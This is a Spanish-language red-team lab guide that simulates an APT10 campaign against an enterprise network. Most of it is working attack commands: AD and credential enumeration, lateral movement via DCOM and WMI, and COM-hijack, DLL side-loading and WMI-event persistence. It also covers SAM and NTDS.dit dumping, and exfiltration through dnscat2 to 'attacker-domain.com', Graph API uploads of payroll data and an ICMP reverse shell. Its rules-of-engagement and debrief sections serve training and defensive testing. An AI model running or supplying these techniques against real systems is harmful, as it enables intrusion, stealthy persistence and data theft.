# Tradecraft — Operación RED DANTE
## Lab-12: Simulación Enterprise — Red Masiva, Persistencia y Exfiltración

**Operación:** RED DANTE | **Adversario:** APT10 (Stone Panda) | **Nivel:** Enterprise Simulation  
**Autor:** Adrián Camacho | **Versión:** 1.0 | **Fecha:** Mayo 2026

---

## Índice

1. [Enterprise Red Team — Metodología y planificación](#1-enterprise-red-team)
2. [Reconocimiento interno masivo](#2-reconocimiento-interno-masivo)
3. [Movimiento lateral en redes heterogéneas](#3-movimiento-lateral-heterogéneo)
4. [Persistencia avanzada y multicapa](#4-persistencia-avanzada)
5. [Exfiltración — Datos fuera sin ser detectado](#5-exfiltración)
6. [Living off the Land — Máximo OPSEC en enterprise](#6-living-off-the-land)
7. [OPSEC — APT10 en simulaciones largas](#7-opsec)

---

## 1. Enterprise Red Team — Metodología y planificación

### La diferencia entre un lab y un engagement enterprise

En labs anteriores cada fase tenía un objetivo técnico claro. Un engagement enterprise es diferente — el objetivo no es demostrar técnicas sino **simular el comportamiento real de un adversario avanzado durante semanas o meses**.

### Fases de un engagement enterprise real

```
Semana 1-2:  Reconocimiento externo + Initial Access
Semana 2-3:  Establecer foothold + persistencia
Semana 3-5:  Reconocimiento interno + movimiento lateral
Semana 5-7:  Escalada hacia objetivos primarios
Semana 7-8:  Exfiltración + limpieza de rastros
Semana 8:    Reporte y presentación
```

### Objetivos de un engagement enterprise vs técnicos

| Objetivo técnico (labs anteriores) | Objetivo enterprise |
|-----------------------------------|---------------------|
| "Obtener DA" | "¿Puede el equipo detectar al atacante antes de que llegue a los crown jewels?" |
| "Ejecutar DCSync" | "¿Cuánto tiempo tarda el SOC en detectar exfiltración?" |
| "Capturar un hash" | "¿Son efectivos los controles compensatorios?" |

### Rules of Engagement en enterprise

En un engagement real se definen claramente:
- **Scope** — qué sistemas son objetivo y cuáles están fuera de scope
- **Exclusiones** — sistemas críticos que no se pueden impactar (producción, backup)
- **Notificación** — quién sabe del engagement (Purple vs Red vs Blind)
- **Escalation** — qué hacer si se descubre un compromiso real durante el engagement
- **Deconfliction** — proceso para evitar confundir al SOC entre actividad real vs red team

---

## 2. Reconocimiento interno masivo

### El reconocimiento interno como fase continua

En un engagement enterprise el reconocimiento no es una fase única — es continuo. Cada sistema comprometido revela nueva información sobre la red.

### Mapeo sistemático de la infraestructura

```powershell
# Enumeración completa con Seatbelt
.\Seatbelt.exe -group=all > seatbelt_output.txt

# Enumeración de AD completa
Import-Module PowerView.ps1
Get-DomainComputer -Properties name,operatingsystem,lastlogondate |
  Where-Object { $_.lastlogondate -gt (Get-Date).AddDays(-30) } |
  Sort-Object lastlogondate -Descending > active_computers.txt

# Mapear shares accesibles
Find-DomainShare -CheckShareAccess -Verbose > accessible_shares.txt

# Usuarios con sesiones activas
Get-NetLoggedon -ComputerName (Get-DomainComputer -Properties name).name > active_sessions.txt
```

### Identificar sistemas de alto valor

```powershell
# Buscar servidores de backup (tienen credenciales de todos los sistemas)
Get-DomainComputer | Where-Object { $_.name -match "backup|bkp|veeam|commvault" }

# Servidores de gestión (SCCM, WSUS, Ansible, etc.)
Get-DomainComputer | Where-Object { $_.name -match "sccm|wsus|mgmt|ansible|puppet" }

# Bastiones y jump servers
Get-DomainComputer | Where-Object { $_.name -match "bastion|jump|rdg|gateway" }

# Servidores de certificados
Get-DomainComputer | Where-Object { $_.name -match "ca|pki|cert" }
```

### Network scanning sin Nmap (OPSEC)

```powershell
# Port scanning con PowerShell puro (sin herramientas externas)
1..1024 | ForEach-Object {
    $port = $_
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $tcp.Connect("10.0.2.50", $port)
        Write-Output "Port $port open"
        $tcp.Close()
    } catch {}
}

# O usar el módulo nativo Test-NetConnection
Test-NetConnection -ComputerName 10.0.2.50 -Port 445
```

---

## 3. Movimiento lateral en redes heterogéneas

### El reto de las redes enterprise reales

En una empresa grande la red no es homogénea — hay Windows, Linux, macOS, appliances de red, sistemas industriales (OT), dispositivos IoT. El movimiento lateral requiere adaptarse a cada tecnología.

### Movimiento lateral en Linux/Unix

```bash
# SSH con credenciales obtenidas
ssh usuario@10.0.5.20 -i id_rsa_robada

# Desde un sistema Linux comprometido
# Buscar credenciales SSH en directorios home
find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
find /root -name "id_rsa" 2>/dev/null

# Historial bash con credenciales
cat ~/.bash_history | grep -i "ssh\|ftp\|mysql\|password\|passwd"

# Credenciales en archivos de configuración
grep -rn "password\|passwd\|secret" /etc/ /opt/ /var/www/ 2>/dev/null
```

### Abusing DCOM para movimiento lateral (sin PSRemoting)

```powershell
# DCOM MMC20.Application — ejecutar comandos remotamente
$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.0.2.50"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\temp\out.txt","7")

# DCOM ShellWindows
$dcom = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application","10.0.2.50"))
$dcom.ShellExecute("cmd.exe","/c whoami > C:\temp\out.txt","","",0)
```

### WMI — Ejecución remota sin PSRemoting

```powershell
# Ejecutar proceso via WMI
Invoke-WmiMethod -ComputerName 10.0.2.50 \
  -Class Win32_Process -Name Create \
  -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt"

# O con credenciales específicas
$cred = Get-Credential
Invoke-WmiMethod -ComputerName 10.0.2.50 -Credential $cred \
  -Class Win32_Process -Name Create \
  -ArgumentList "powershell -enc BASE64"
```

---

## 4. Persistencia Avanzada y Multicapa

### Por qué necesitamos persistencia multicapa

En un engagement largo el Blue Team puede detectar y eliminar algunos mecanismos de persistencia. Con persistencia multicapa, eliminar uno no elimina el acceso.

### Estrategia de persistencia en capas

```
Capa 1 (ruidosa, aceptable):  Tarea programada en workstation comprometida
Capa 2 (silenciosa):          COM Hijacking en perfil de usuario
Capa 3 (muy silenciosa):      DLL Side-Loading en aplicación legítima
Capa 4 (persistencia cloud):  PRT o certificado de Azure AD (ver Lab-14)
Capa 5 (firmware/BIOS):       Solo si el engagement lo requiere explícitamente
```

### COM Hijacking — Persistencia sin privilegios

```powershell
# Buscar COM objects cargados por aplicaciones legítimas que se pueden hijackear
# (se buscan en HKCU que no requiere admin)

# Localizar COM objects vulnerables con PowerSploit
Find-PathHijack

# Registrar COM object malicioso en HKCU
$regPath = "HKCU:\Software\Classes\CLSID\{GUID-DEL-COM-LEGITIMO}\InprocServer32"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Users\usuario\AppData\Local\malicious.dll"
Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Apartment"
```

### DLL Side-Loading

Aplicaciones legítimas a veces cargan DLLs por nombre sin path completo. Si podemos colocar una DLL maliciosa en un directorio con mayor prioridad en el search order, se carga la nuestra.

```powershell
# Identificar aplicaciones vulnerables
# Procmon (Sysinternals) filtrado por "NAME NOT FOUND" en operaciones de lectura de DLL

# Colocar DLL maliciosa
Copy-Item malicious.dll "C:\Program Files\VulnerableApp\legitimate.dll"
# La próxima vez que VulnerableApp arranque, carga nuestra DLL
```

### WMI Event Subscription — Persistencia sin archivo en disco

```powershell
# Persistencia via WMI Events — extremadamente sigilosa
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "SystemFilter"
    EventNamespace = "root\cimv2"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 9 AND TargetInstance.Minute = 0"
    QueryLanguage = "WQL"
}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "SystemConsumer"
    CommandLineTemplate = "powershell -enc BASE64_PAYLOAD"
}

$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
# Se ejecuta a las 9:00 AM cada día — sin archivos en disco, sin tareas programadas visibles
```

---

## 5. Exfiltración — Datos fuera sin ser detectado

### El reto de la exfiltración en enterprise

Los entornos enterprise tienen:
- DLP (Data Loss Prevention) — detecta exfiltración de datos sensibles
- Proxies con inspección SSL — ven el contenido del tráfico HTTPS
- Análisis de volumen — detectan grandes transferencias de datos
- Egress filtering — limitan a qué destinos se puede conectar

### Técnicas de exfiltración sigilosa

#### DNS exfiltration — Bypassar todos los controles HTTP

```bash
# Codificar datos en queries DNS
# Los datos se transmiten como subdominio de un dominio controlado
# El tráfico DNS rara vez está inspeccionado

# Herramienta: dnscat2
# Servidor en Kali
ruby dnscat2.rb attacker-domain.com

# Cliente en víctima (PowerShell)
.\dnscat2-powershell\dnscat2.ps1 -Domain attacker-domain.com
```

#### HTTPS a sitios de confianza (OneDrive, SharePoint)

```powershell
# Subir datos a OneDrive legítimo usando credenciales comprometidas
# El tráfico parece actividad normal de Microsoft 365

# Con token de Azure AD obtenido via PRT
$headers = @{ "Authorization" = "Bearer $token" }
$body = Get-Content "C:\CorporateData\Finance\nominas_2026.txt" -Raw
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me/drive/root:/exfil.txt:/content" `
  -Method PUT -Headers $headers -Body $body
```

#### ICMP tunneling — Completamente ignorado por la mayoría de firewalls

```bash
# icmpsh — shell reversa via ICMP
# El firewall permite ping pero no inspecciona el payload

# Servidor (Kali)
python icmpsh_m.py 10.0.2.9 10.0.2.8

# Cliente (víctima)
.\icmpsh.exe -t 10.0.2.9 -d 500 -b 30 -s 128
```

#### Fragmentación y timing

Para evitar detección por volumen:
- Exfiltrar en pequeños chunks (< 1MB por sesión)
- Espaciar las transferencias en el tiempo (una por día)
- Mezclar el tráfico con actividad legítima del usuario
- Usar compresión + cifrado para reducir el tamaño y evitar DLP

---

## 6. Living off the Land — Máximo OPSEC en enterprise

### El principio fundamental en enterprise

En un engagement enterprise de larga duración, cada binario no firmado que tocas el disco es un riesgo. Los EDR modernos tienen inventario de todos los ejecutables — cualquier nuevo binario es sospechoso.

### Herramientas nativas de Windows para Red Team

```powershell
# Reemplazar Nmap por:
Test-NetConnection, [System.Net.Sockets.TcpClient]

# Reemplazar PowerView por:
Get-ADUser, Get-ADComputer, Get-ADGroup (módulo ActiveDirectory nativo)
nltest /dclist:dominio

# Reemplazar SharpHound por:
bloodhound-python (desde Kali) via red interna

# Reemplazar Mimikatz por:
reg save HKLM\SAM C:\temp\sam.bak (desde cmd nativo)
vssadmin create shadow /for=C:  → copiar NTDS.dit

# Reemplazar PsExec por:
wmic /node:TARGET process call create "CMD"
Invoke-WmiMethod (PowerShell nativo)
```

### Abusing herramientas de administración legítimas

```powershell
# SCCM/ConfigMgr — si está en el entorno, úsalo para distribución
# Un payload distribuido via SCCM parece completamente legítimo

# WSUS — distribuir "actualizaciones" maliciosas via WSUS comprometido
# Requiere comprometer el servidor WSUS

# GPO — ya visto en Lab-01, pero en enterprise con múltiples OUs
# Cada OU puede tener GPOs diferentes → múltiples vectores
```

---

## 7. OPSEC — APT10 en simulaciones largas

### APT10 — Características distintivas

APT10 (Stone Panda, MenuPass) opera campañas de muy larga duración (meses o años) con énfasis en:
- **LOTL extremo** — mínimo uso de herramientas propias
- **Persistencia robusta** — múltiples mecanismos redundantes
- **Exfiltración gradual** — pequeños volúmenes durante meses
- **Adaptación** — si detectan actividad sospechosa, paran y esperan

### Métricas de éxito en un engagement enterprise

En lugar de "obtuvimos DA", las métricas relevantes son:
- **Time to Detection (TTD)** — cuánto tardó el SOC en detectar la actividad
- **Time to Containment (TTC)** — cuánto tardó en contener el incidente
- **Crown Jewels reached** — llegamos a los activos de mayor valor sin detección
- **Persistence duration** — cuánto tiempo mantuvimos acceso sin ser detectados

### Documento de debriefing post-engagement

Al final de un engagement enterprise se produce un documento que incluye:
1. **Executive Summary** — impacto para la dirección
2. **Attack Narrative** — historia cronológica del ataque
3. **Gaps identified** — debilidades de detección encontradas
4. **Crown Jewels assessment** — qué datos críticos estaban expuestos
5. **Recommendations** — prioridad alta/media/baja

---

## Referencias

- [MITRE ATT&CK — APT10](https://attack.mitre.org/groups/G0045/)
- [LOTL Techniques Database](https://lolbas-project.github.io/)
- [WMI Offense, Defense, Forensics — FireEye](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)
- [Enterprise Red Team Planning — Joe Vest](https://posts.specterops.io/planning-a-red-team-exercise-da7ad52e0c66)

---

*Operación RED DANTE — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*